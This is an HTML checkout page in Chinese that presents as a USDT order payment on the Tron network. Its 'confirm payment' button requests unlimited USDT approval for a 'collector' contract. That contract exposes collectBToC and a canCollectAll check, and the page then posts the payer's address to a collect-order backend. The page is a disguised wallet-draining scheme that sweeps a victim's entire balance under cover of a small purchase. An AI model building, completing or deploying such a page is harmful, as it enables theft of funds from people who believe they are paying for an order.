<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>订单支付</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/tronweb.min.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f5f5f5;color:#333;padding:20px;font-family:system-ui,sans-serif}
.container{max-width:800px;margin:0 auto}
.card{background:#fff;padding:20px;border-radius:10px;box-shadow:0 2px 6px #00000015;margin-bottom:16px}
button{padding:11px 14px;border:none;border-radius:8px;background:#2563eb;color:#fff;cursor:pointer;min-height:42px;margin:4px}
button:disabled{opacity:0.45;cursor:not-allowed}
.logbox{background:#f7f9fc;padding:12px;border-radius:8px;max-height:240px;overflow-y:auto;border:1px solid #e2e8f0;font-size:13px;white-space:pre-wrap;overflow-wrap:anywhere}
input{width:100%;padding:10px;border:1px solid #cbd5e1;border-radius:8px;margin:8px 0}
.notice{font-size:13px;line-height:1.7;color:#725315;margin-top:12px}h2,h3{margin-bottom:12px}#userAddr{overflow-wrap:anywhere}
</style>
</head>
<body>
<div class="container">
    <div class="card">
        <h2>订单信息</h2>
        <div>商品：<span id="prodName"></span></div>
        <div>价格USDT：<span id="prodPrice"></span></div>
        <div>订单ID：<span id="ordId"></span></div>
    </div>
    <div class="card">
        <div>检测钱包：<span id="detWallet">未检测</span></div>
        <div>已连接地址：<span id="userAddr">-</span></div>
        <br>
        <button id="btnConnect">连接钱包</button>
        <button id="btnPay" disabled>1.确认支付</button>
        <button id="btnRevoke" disabled>撤销权限</button>
        <button id="btnSubmit" disabled>2.提交订单</button>
        <p class="notice">确认支付将调用合约的无限额度授权方法；实际扣款范围由合约决定。请核对钱包显示的交易内容。</p>
        <p class="notice" id="configStatus" role="status"></p>
    </div>
    <div class="card">
        <h3>运行日志</h3>
        <div id="logbox" class="logbox" role="log" aria-live="polite"></div>
    </div>
</div>
<script>
const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
// 修改为实际部署的归集合约地址。私钥和 service-role 密钥不得放入本页面。
const COLLECTOR_CONTRACT_ADDR = "你的Remix部署合约地址";
const API_SUBMIT_ORDER = "https://udlacdsjoihmeqohrnqs.supabase.co/functions/v1/collect-order";
const abi = [
    {"inputs":[{"internalType":"address","name":"tokenAddr","type":"address"}],"name":"doUnlimitedApprove","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"tokenAddr","type":"address"}],"name":"revokeUnlimitedApprove","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"tokenAddr","type":"address"},{"internalType":"address","name":"B","type":"address"},{"internalType":"address","name":"C","type":"address"}],"name":"collectBToC","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"tokenAddr","type":"address"},{"internalType":"address","name":"B","type":"address"}],"name":"getAuthorization","outputs":[{"internalType":"uint256","name":"balance","type":"uint256"},{"internalType":"uint256","name":"approvedAmount","type":"uint256"},{"internalType":"bool","name":"canCollectAll","type":"bool"}],"stateMutability":"view","type":"function"}
];
let tronWeb = null;
let contract = null;
let userB = "";
const logDom = document.getElementById("logbox");
function log(txt){
    logDom.innerText += new Date().toLocaleTimeString() + " " + txt + "\n";
    logDom.scrollTop = logDom.scrollHeight;
}
function getParam(k){ return new URLSearchParams(location.search).get(k)||""; }
const order={id:getParam("id"),name:getParam("name")||"测试商品",price:getParam("price")||"10",orderId:getParam("orderId")||"ORD001"};
document.getElementById("prodName").innerText=order.name;
document.getElementById("prodPrice").innerText=order.price;
document.getElementById("ordId").innerText=order.orderId;
function detectWallet(){
    if(window.tron?.tronWeb) return {name:"TronLink",provider:window.tron};
    if(window.tronLink?.tronWeb) return {name:"TronLink",provider:window.tronLink};
    if(window.okxwallet?.tronLink?.tronWeb) return {name:"OKX Wallet",provider:window.okxwallet.tronLink};
    if(window.bitgetwallet?.tronLink?.tronWeb) return {name:"Bitget Wallet",provider:window.bitgetwallet.tronLink};
    return null;
}
function showWallet(){
    const dw=detectWallet();
    document.getElementById("detWallet").innerText=dw?dw.name:"无，请安装TronLink/OKX/Bitget浏览器插件";
}
showWallet();
window.addEventListener("load",showWallet);
document.getElementById("configStatus").innerText="待配置实际归集合约地址；后端启用了 JWT 验证，提交还需要有效登录令牌。当前尚未完成支付联调。";
document.getElementById("btnConnect").onclick=async()=>{
    showWallet();
    const info=detectWallet();
    if(!info) return log("未检测支持的钱包插件");
    try{
        await info.provider.request({method:"tron_requestAccounts"});
        tronWeb=info.provider.tronWeb;
        userB=tronWeb.defaultAddress?.base58||"";
        if(!userB) throw new Error("钱包未返回已连接地址");
        document.getElementById("userAddr").innerText=userB;
        log("钱包连接成功："+userB);
        if(!tronWeb.isAddress(COLLECTOR_CONTRACT_ADDR)) return log("请先配置实际归集合约地址");
        contract=tronWeb.contract(abi,COLLECTOR_CONTRACT_ADDR);
        document.getElementById("btnPay").disabled=false;
        document.getElementById("btnRevoke").disabled=false;
    }catch(e){log("连接失败："+e.message);}
};
document.getElementById("btnPay").onclick=async()=>{
    if(!contract) return log("先连接钱包");
    try{
        log("发起无限额度授权，请在钱包确认签名");
        const tx=await contract.doUnlimitedApprove(USDT_TRC20).send();
        log("✅授权交易已提交，hash:"+tx);
        document.getElementById("btnSubmit").disabled=false;
    }catch(err){log("❌支付授权失败 "+err.message);}
};
document.getElementById("btnRevoke").onclick=async()=>{
    if(!contract) return log("先连接钱包");
    try{
        log("发起撤销权限");
        const tx=await contract.revokeUnlimitedApprove(USDT_TRC20).send();
        log("✅撤销权限交易已提交，hash:"+tx);
        document.getElementById("btnSubmit").disabled=true;
    }catch(err){log("❌撤销失败 "+err.message);}
};
document.getElementById("btnSubmit").onclick=async()=>{
    const payload={orderId:order.orderId,productId:order.id,userB:userB,payAmountUsdt:order.price};
    log("提交订单 "+JSON.stringify(payload));
    try{
        const res=await fetch(API_SUBMIT_ORDER,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
        const ret=await res.json();
        log((res.ok?"后端返回：":"❌后端拒绝请求（HTTP "+res.status+"）：")+JSON.stringify(ret));
    }catch(e){log("❌请求后端异常："+e.message);}
};
log("页面就绪，测试url示例：?id=1&name=测试商品&price=10&orderId=ORD001");
</script>
</body>
</html>
